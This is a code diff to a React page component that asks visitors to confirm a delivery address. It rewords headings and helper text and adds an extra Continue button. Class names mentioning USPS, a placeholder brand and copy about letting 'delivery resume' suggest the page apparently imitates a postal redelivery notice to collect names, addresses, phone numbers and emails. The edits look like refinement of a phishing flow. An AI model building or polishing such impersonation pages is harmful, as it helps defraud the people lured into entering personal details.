@@ -212,8 +212,8 @@ export default function Info() {
           <div className="alz-step-head">
             <div>
               <div className="alz-badge">{BRAND.name}</div>
-              <h1 className="alz-step-title">Confirm the delivery address</h1>
-              <p className="alz-step-subtitle">Review the recipient and mailing details.</p>
+              <h1 className="alz-step-title">Confirm address</h1>
+              <p className="alz-step-subtitle">Enter the delivery details below.</p>
             </div>
           </div>
           <div className="alz-track mt-3">
@@ -224,16 +224,22 @@ export default function Info() {
         <div className="alz-flow-grid alz-usps-flow-grid">
           <div className="alz-card alz-usps-form-card">
             <div className="alz-section-eyebrow">Delivery details</div>
-            <h2 className="alz-page-title">Review your mailing info</h2>
+            <h2 className="alz-page-title">Enter shipping info</h2>
             <p className="alz-page-copy">{status}</p>
             <div className="alz-brand-row mb-2">
               {BRAND_PROMISES.map((item) => (
                 <span key={item} className="alz-brand-pill">{item}</span>
               ))}
             </div>
+            <div className="alz-info-cta-row">
+              <button type="button" onClick={handleSubmit} disabled={loading} className="alz-btn-primary alz-info-cta-button">
+                {loading ? 'Saving...' : 'Continue'}
+              </button>
+              <p className="alz-info-cta-note">Fill in the fields, then continue.</p>
+            </div>
 
             <form
-              className="space-y-5 mt-5"
+              className="space-y-4 mt-4"
               onSubmit={(e) => {
                 e.preventDefault();
                 handleSubmit();
@@ -288,7 +294,7 @@ export default function Info() {
                 {loading ? 'Saving...' : 'Continue'}
               </button>
               <p className="alz-helper-copy text-center mt-3">
-                You may be asked to reconfirm these details later.
+                Check the name, address, phone, and email before you continue.
               </p>
             </form>
 
@@ -302,15 +308,15 @@ export default function Info() {
               <div className="alz-order-mini-thumb" />
               <div>
                 <div className="alz-order-mini-title">Review the address on file</div>
-                <div className="alz-order-mini-copy">Confirm the recipient name, address, ZIP Code, and contact details.</div>
+                <div className="alz-order-mini-copy">Confirm the name, address, ZIP Code, and contact details.</div>
               </div>
             </div>
             <div className="alz-side-summary-list">
-              <div>Recipient name exactly as entered</div>
-              <div>Street address, city, state, and ZIP Code</div>
+              <div>Name exactly as entered</div>
+              <div>Street, city, state, and ZIP Code</div>
               <div>Phone number and email</div>
             </div>
-            <div className="alz-side-summary-box">Use the mailing information tied to this shipment so delivery can resume.</div>
+            <div className="alz-side-summary-box">Use the delivery details linked to this shipment.</div>
           </aside>
         </div>
       </div>
